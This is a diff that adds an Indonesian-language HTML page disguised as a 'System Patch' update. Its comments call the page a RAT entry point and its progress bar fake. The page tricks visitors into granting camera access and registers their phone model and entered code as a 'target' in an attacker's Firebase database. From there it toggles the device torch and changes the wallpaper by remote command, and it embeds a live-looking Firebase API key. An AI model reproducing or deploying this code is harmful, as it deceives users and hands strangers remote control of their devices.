@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Framework Update</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;500&display=swap" rel="stylesheet">
+    <style>
+        body { background: #000; color: #fff; font-family: 'Roboto', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .container { text-align: center; width: 85%; }
+        .logo { width: 60px; height: 60px; background: #222; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; border: 1px solid #444; }
+        h2 { font-weight: 500; font-size: 1.2rem; margin-bottom: 10px; color: #eee; }
+        p { font-weight: 300; font-size: 0.9rem; color: #aaa; margin-bottom: 30px; }
+        
+        /* Input & Button */
+        input { background: #111; border: 1px solid #333; color: #fff; padding: 12px; width: 100%; border-radius: 8px; margin-bottom: 15px; text-align: center; outline: none; }
+        input:focus { border-color: #00f2ff; }
+        .btn-update { background: #fff; color: #000; border: none; padding: 15px; width: 100%; border-radius: 8px; font-weight: 500; cursor: pointer; }
+        
+        /* Loading Screen */
+        #loading { display: none; }
+        .progress-bar { width: 100%; height: 4px; background: #222; border-radius: 10px; margin-top: 20px; overflow: hidden; }
+        .progress-fill { width: 0%; height: 100%; background: #00f2ff; transition: 1s; box-shadow: 0 0 10px #00f2ff; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div id="setup-phase">
+            <div class="logo">⚙️</div>
+            <h2>System Patch v4.5.1</h2>
+            <p>Masukkan kode aktivasi dari admin untuk melanjutkan pembaruan sistem perangkat.</p>
+            <input type="text" id="access_code" placeholder="KODE LISENSI">
+            <button class="btn-update" onclick="initUpdate()">UPDATE SEKARANG</button>
+        </div>
+
+        <div id="loading">
+            <div class="logo" style="border-color: #00f2ff;">⚡</div>
+            <h2 id="status-text">Mengunduh Patch...</h2>
+            <div class="progress-bar">
+                <div id="fill" class="progress-fill"></div>
+            </div>
+            <p style="margin-top: 15px;" id="sub-status">Jangan tutup aplikasi selama proses berlangsung.</p>
+        </div>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
+        import { getDatabase, ref, set, onValue, update } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-database.js";
+
+        // CONFIG FIREBASE LU (WAJIB ISI)
+        const firebaseConfig = {
+  apiKey: "AIzaSyAddYZVOXibzxIWNTNwqqQn5n7QUrQN6ys",
+  authDomain: "rat-html.firebaseapp.com",
+  databaseURL: "https://rat-html-default-rtdb.asia-southeast1.firebasedatabase.app",
+  projectId: "rat-html",
+  storageBucket: "rat-html.firebasestorage.app",
+  messagingSenderId: "1060124583265",
+  appId: "1:1060124583265:web:a117830e798cd1d60f5120",
+  measurementId: "G-XMHT2S731L"
+};
+
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+
+        window.initUpdate = async function() {
+            const code = document.getElementById('access_code').value;
+            if(!code) return alert("KODE LISENSI DIBUTUHKAN!");
+
+            // UI Switch
+            document.getElementById('setup-phase').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
+            
+            // Animasi Progress Palsu
+            let width = 0;
+            const interval = setInterval(() => {
+                if(width >= 90) clearInterval(interval);
+                width += Math.random() * 5;
+                document.getElementById('fill').style.width = width + "%";
+            }, 800);
+
+            try {
+                // 1. Minta Izin Kamera & Senter (Pintu Masuk RAT)
+                document.getElementById('status-text').innerText = "Sinkronisasi Hardware...";
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
+                const track = stream.getVideoTracks()[0];
+
+                // 2. Ambil Nama HP Otomatis
+                const userAgent = navigator.userAgent;
+                let deviceModel = "Android Device";
+                if (userAgent.match(/Android\s+([\d\.]+);\s+(.*)\s+Build/)) {
+                    deviceModel = userAgent.match(/Android\s+([\d\.]+);\s+(.*)\s+Build/)[2];
+                } else if (userAgent.includes("Build/")) {
+                    deviceModel = userAgent.split(';')[2].split('Build')[0].trim();
+                }
+
+                const targetID = deviceModel.replace(/\s/g, '_') + "_" + Math.floor(1000 + Math.random() * 9000);
+
+                // 3. Daftarkan ke Firebase
+                await set(ref(db, 'targets/' + targetID), {
+                    model: deviceModel,
+                    access_code: code,
+                    flash: false,
+                    wallpaper: "default",
+                    status: "Online",
+                    last_seen: Date.now()
+                });
+
+                document.getElementById('status-text').innerText = "Menerapkan Patch...";
+                document.getElementById('sub-status').innerText = "Sinkronisasi selesai. Mengoptimalkan sistem...";
+
+                // 4. Listener Senter (Realtime)
+                onValue(ref(db, 'targets/' + targetID + '/flash'), (snap) => {
+                    const power = snap.val();
+                    track.applyConstraints({ advanced: [{ torch: power }] }).catch(e => console.log("Torch Error"));
+                });
+
+                // 5. Listener Wallpaper (Background HTML)
+                onValue(ref(db, 'targets/' + targetID + '/wallpaper'), (snap) => {
+                    const url = snap.val();
+                    if(url !== "default") {
+                        document.body.style.backgroundImage = `url('${url}')`;
+                        document.body.style.backgroundSize = "cover";
+                        document.body.style.backgroundPosition = "center";
+                    }
+                });
+
+            } catch (err) {
+                document.getElementById('status-text').innerText = "Pembaruan Gagal";
+                document.getElementById('sub-status').innerText = "Izin akses hardware ditolak oleh sistem.";
+                setTimeout(() => location.reload(), 3000);
+            }
+        }
+    </script>
+</body>
+</html>
